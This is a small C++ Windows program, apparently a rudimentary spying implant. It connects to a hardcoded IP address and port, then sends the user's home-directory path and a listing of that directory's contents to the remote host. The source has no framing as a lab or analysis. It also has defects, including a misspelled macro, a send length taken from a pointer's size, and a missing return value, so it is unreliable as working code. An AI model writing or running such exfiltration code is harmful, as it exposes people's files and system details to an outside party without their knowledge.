#define _WINSOC_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")

#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

char* userDir()
{

	char* pPath;
	pPath = getenv ("USERPROFILE");
		if (pPath != NULL)
		{ return pPath;
		}
		else {
			perror("");
		}
}
int main()
{

	WSADATA WSAData;
	SOCKET server;
	SOCKADDR_IN addr;
	
	WSAStartup(MAKEWORD(2, 0), &WSAData);
	server = socket(AF_INET, SOCK_STREAM, 0);
	addr.sin_addr.s_addr = inet_addr("10.53.3.108");
	addr.sin_family = AF_INET;
	addr.sin_port = htons(37777);
	connect(server, (SOCKADDR *)&addr, sizeof(addr));
	
	char* pPath = userDir();
	send(server, pPath, sizeof(pPath), 0);
	
	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir (pPath)) != NULL)
	{
		while ((ent = readdir (dir)) != NULL)
		{
			send (server, ent->d_name, sizeof(ent->d_name), 0);
		}
		closedir (dir);
		}
		else
		{
			perror("");
			
		}
	
}
	

